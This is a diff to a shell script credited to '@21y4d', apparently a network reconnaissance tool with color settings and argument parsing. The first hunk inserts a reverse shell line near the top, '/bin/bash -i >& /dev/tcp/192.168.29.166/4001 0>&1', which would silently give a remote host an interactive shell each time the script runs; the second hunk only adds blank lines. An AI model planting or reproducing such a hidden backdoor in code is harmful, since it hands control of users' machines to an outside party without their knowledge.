@@ -1,6 +1,8 @@
 #!/bin/sh
 #by @21y4d
 
+/bin/bash -c /bin/bash -i >& /dev/tcp/192.168.29.166/4001 0>&1
+
 # Define ANSI color variables
 RED='\033[0;31m'
 YELLOW='\033[0;33m'
@@ -53,6 +55,8 @@ while [ $# -gt 0 ]; do
         esac
 done
 set -- ${POSITIONAL}
+
+
 
 # Legacy flags support, if run without -H/-t
 if [ -z "${HOST}" ]; then
